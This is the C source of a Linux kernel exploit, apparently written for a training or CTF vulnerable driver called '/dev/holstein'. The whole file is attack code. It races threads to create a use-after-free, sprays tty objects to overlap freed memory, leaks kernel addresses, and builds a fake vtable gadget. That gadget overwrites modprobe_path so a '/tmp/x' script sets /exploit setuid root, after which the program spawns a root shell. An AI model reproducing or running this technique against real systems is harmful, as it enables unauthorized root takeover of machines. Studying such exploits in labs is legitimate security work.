#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <pthread.h>
#include <sched.h>

#define for_x(i, a, b) for(int i = a; i <= b; i++)
#define for_n(i, a, b) for(int i = a; i >= b; i--)
#define inc idx++
#define save_state(val)                                   \
    do {                                                  \
        __asm__(                                          \
            ".intel_syntax noprefix;"                     \
            "mov user_cs, cs;"                            \
            "mov user_ss, ss;"                            \
            "mov user_rsp, rsp;"                          \
            "mov user_rbp, rbp;" /*this to make sure stack frame doesnt corrupted*/ \
            "pushfq;"                                     \
            "pop user_rflags;"                            \
            ".att_syntax;"                                \
        );                                                \
        user_rip = val;                                   \
        puts("[$] saved state");                          \
    } while (0)

typedef uint64_t u64;
typedef uint32_t u32;

u64 user_rip, user_cs, user_rflags, user_rsp, user_ss, user_rbp;
u64 kbase, g_buf, koffset;
char buf[0x505]; // declaration in global to prevent bad coding pratice (etc, forget to rewrite struct metadata value when heap overflow)
u64 rop[105];
u64 fd1, fd2, okrace = 0; // to race condition

void win()
{
    system("echo '#!/bin/sh\nchown root:root /exploit\nchmod 4555 /exploit' > /tmp/x");
    system("chmod 777 /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod 777 /tmp/dummy");
    system("/tmp/dummy");
    puts("[*] win, run './exploit 13377554' to get root");
}

void *race(void *arg)
{
    // idk
    cpu_set_t *cpu_set = (cpu_set_t *)arg;
    if (sched_setaffinity(gettid(), sizeof(cpu_set_t), cpu_set))
    {
        puts("sched_setaffinity");
        _exit(-1);
    }

    while(1)
    {
        while(!okrace)
        {
            int fd = open("/dev/holstein", O_RDWR);
            if(fd == fd2) okrace = 1;
            if(fd != -1 && okrace == 0) close(fd);
        }
        if(write(3, "A", 1) != 1 || write(4, "a", 1) != 1)
        {
            close(3);
            close(4);
            okrace = 0;
        }
        else break;
        usleep(100);
    }
    return NULL;
}

void *spray_thread(void *arg)
{
    // idk
    cpu_set_t *cpu_set = (cpu_set_t *)arg;
    if (sched_setaffinity(gettid(), sizeof(cpu_set_t), cpu_set))
    {
        puts("sched_setaffinity");
        _exit(-1);
    }

    // spraying
    long spray[805];
    u64 x = 0;
    printf("[*] spraying %d objects\n", 800);
    for_x(i, 0, 799)
    {
        spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
        if(spray[i] == -1) 
        {
            for_x(j, 0, i - 1) close(spray[j]);
            return (void *)-1;
        }
        if(read(fd2, &x, 8) == 8 && x == 0x0000000100005401) // check if tty if overlap with fd2
        {
            for_x(j, 0, i - 1) close(spray[j]);
            return (void *)spray[i];
        }
    }
    for_x(j, 0, 799) close(spray[j]);
    return (void *)-1;
}

u64 create_overlap()
{
    pthread_t th1, th2;
    char tmpbuf[0x10] = {0};
    cpu_set_t t1_cpu, t2_cpu;

    // cpu affinity
    CPU_ZERO(&t1_cpu);
    CPU_ZERO(&t2_cpu);
    CPU_SET(0, &t1_cpu);
    CPU_SET(1, &t2_cpu);

    // check 2 next fds
    fd1 = open("/tmp", O_RDONLY);
    fd2 = open("/tmp", O_RDONLY);
    close(fd1);
    close(fd2);
    printf("[?] next two fds are: fd1 <%ld>, fd2 <%ld>\n", fd1, fd2);

    // race condition
    puts("[*] running 2 threads");
    pthread_create(&th1, 0, race, (void *)&t1_cpu);
    pthread_create(&th2, 0, race, (void *)&t2_cpu);
    pthread_join(th1, 0);
    pthread_join(th2, 0);
        // double check race
    write(fd1, "vanished", 9);
    read(fd2, tmpbuf, 9);
    if(strcmp(tmpbuf, "vanished")) 
    {
        // should improve this
        _exit(1);
    }
    puts("[*] race condition success");

    // create UAF
    close(fd1);

    // heap spray
    long victim_fd = -1;
    int cnt = 0;
    while(victim_fd == -1)
    {
        printf("[*] try spraying on CPU: %d\n", cnt + 1);
        if(cnt == 0) 
        {
            victim_fd = (long)spray_thread((void *)&t1_cpu);
        }
        else 
        {
            pthread_create(&th1, 0, spray_thread, (void *)&t2_cpu);
            pthread_join(th1, (void *)&victim_fd);
        }
        cnt = 1 - cnt;
    }

    printf("[???] overlapped victim fd <%ld>\n", victim_fd);
    return (u64)victim_fd;
} 

int main(int argc, char **argv)
{
    // too lazy to write separate program to spawn a shell
    if (argc == 2 && !strcmp(argv[1], "13377554"))
    {
        printf("[+] getuid() returns %d\n", geteuid());
        setuid(0);
        setgid(0);
        system("/bin/sh");
        return 0;
    }
    // NORMAL EXPLOIT START FROM HERE

    puts("[*] UAF #1");
	u64 victim_ptmx = create_overlap();

    // leaking kbase and g_buf (UAF#1's fd2's g_buf)
    printf("[*] leaking\n");
    read(fd2, buf, 0x400);
    kbase = *(u64 *)&buf[0x18] - 0xc3afe0;
    g_buf = *(u64 *)&buf[0x38] - 0x38;
    printf("[*] kbase: 0x%lx\n", kbase);
    printf("[*] g_buf: 0x%lx\n", g_buf);

    koffset = kbase - 0xffffffff81000000;
    printf("[?] koffset: 0x%lx\n", koffset);

    // prepare gadget
    u64 modprobe_path = koffset + 0xffffffff81e384c0;
    u64 mov_ptr_rdx_rcx_ret = koffset + 0xffffffff81048687;

    // place gadget at the end of tty struct to save memory, no need more uaf, no need more race condition
    *(u64 *)(&buf[0x3f8]) = mov_ptr_rdx_rcx_ret;

    // fake vtable
    *(u64 *)(&buf[0x18]) = (g_buf + 0x3f8) - (0xc * 8); // padding the pivot_gadget at 0xc offset

    // overwrite tty struct
    write(fd2, buf, 0x400);

    // overwrite modprobe_path -> "/tmp/x"
    ioctl(victim_ptmx, 0x706d742f, modprobe_path);
    ioctl(victim_ptmx, 0x782f, modprobe_path + 4);
    
    // trigger modprobe_path
    win();

    // clea up
    close(victim_ptmx);
}
